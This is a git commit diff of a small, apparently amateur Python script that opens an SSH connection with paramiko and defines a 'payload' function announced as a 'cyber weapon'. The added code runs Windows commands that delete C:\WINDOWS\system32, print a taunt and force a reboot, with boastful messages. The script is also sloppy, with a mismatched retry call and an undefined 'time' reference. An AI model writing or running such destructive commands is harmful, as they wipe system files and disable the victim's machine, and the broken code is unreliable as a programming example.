a63e0761feb30bdf6229d6b95624951f6874b858
Sam Scotson <118854225+Sam-Scotson@users.noreply.github.com>
2023-04-20 22:01:53 +1200

    Update L,LE.py

--- L,LE.py
+++ L,LE.py
@@ -1,7 +1,8 @@
 import os
 import time as t
+clear = lambda: os.system('cls')
 
-def user_input():
+def ssh_input():
     global keyPath, ipad, usern, passw
     keyPath = input('enter ssh key path i.e C:\Users\Sam\Desktop\pyoutputs\keys\ssh')
     ipad = input('enter ip adress')
@@ -9,7 +10,7 @@ def user_input():
     passw = input('enter password')
     return(keyPath, ipad, usern, passw)
 
-def tunnel(ipad, usern, passw, keyPath):
+def ssh_tunnel(ipad, usern, passw, keyPath):
     from paramiko import SSHClient, AutoAddPolicy
     client = SSHClient()
     keyPath1 = keyPath.replace('\\', '/')
@@ -17,20 +18,27 @@ def tunnel(ipad, usern, passw, keyPath):
     client.load_system_host_keys(keyPath1)
     client.set_missing_host_key_policy(AutoAddPolicy())
     try:
-        print('Digging tunnel ->O')
+        print('Digging a tunnel ->O')
         #.connect('ipadres=192.168.1.0', username='root', password= 'password1')
         client.connect(ipad, username=usern, password=passw)
         print('Your through! =)')
     except IOError as e:
         print('Error, trying again')
-        user_input()
-        tunnel(ipad, usern, passw)
+        ssh_input()
+        ssh_tunnel(ipad, usern, passw)
 
 def payload():
-    clear = lambda: os.system('cls')
-    clear()
     print('dropping bomb! \v/')
-    os.system('start /B start cmd.exe @cmd /k del c:\\WINDOWS\system32')
+    try:
+        os.system('start /B start cmd.exe') 
+        clear()
+        os.system('@cmd /k del c:\\WINDOWS\system32')
+        clear()
+        os.system('@cmd /k echo lol, lmao even')
+        os.system('@cmd /k shutdown -r')
+    except AttributeError as e:
+        print('restarting')
+        main()
     print('fucked em up!')
 
 def check_Target():
@@ -43,19 +51,12 @@ def check_Target():
         main()
     else:
         print('Currently inside '+cwd)
-    
-                                                                                                                 
-
-
-
+                                                                                                             
 def main():
     print('starting up cyber weapon in minecraft')
     print('loading.................')
     t.sleep(5)
     print()
-
-
-
 
 time.sleep(5)
 #gives file location inside host
@@ -64,8 +65,6 @@ cwd = os.getcwd()
 dirlist = os.listdir()
 print(cwd, dirlist)
 #client.close()
-
-
 
 import subprocess
 raw = r'C:\Windows\System32\cmd.exe'
